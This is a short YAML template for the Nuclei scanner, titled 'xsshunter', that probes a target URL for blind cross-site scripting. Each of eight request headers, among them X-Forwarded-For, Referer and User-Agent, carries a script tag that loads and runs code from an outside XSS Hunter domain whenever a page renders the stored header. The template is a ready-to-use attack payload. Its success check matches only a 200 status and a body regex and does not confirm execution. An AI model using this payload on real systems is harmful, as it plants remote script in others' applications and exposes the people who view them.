id: xsshunter

info:
  name: xsshunter
  author: momika233(https://twitter.com/momika233)
  severity: high
  reference:
    - https://xsshunter.com/
  tags: xsshunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}"
      - "{{BaseURL}}"


    headers:
      X-Client-IP: <script>$.getScript("//momika233.xss.ht")</script>
      X-Remote-IP: <script>$.getScript("//momika233.xss.ht")</script>
      X-Remote-Addr: <script>$.getScript("//momika233.xss.ht")</script>
      X-Forwarded-For: <script>$.getScript("//momika233.xss.ht")</script>
      X-Originating-IP: <script>$.getScript("//momika233.xss.ht")</script>
      Referer: <script>$.getScript("//momika233.xss.ht")</script>
      Origin: <script>$.getScript("//momika233.xss.ht")</script>
      User-Agent: <script>$.getScript("//momika233.xss.ht")</script>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "success.*results"
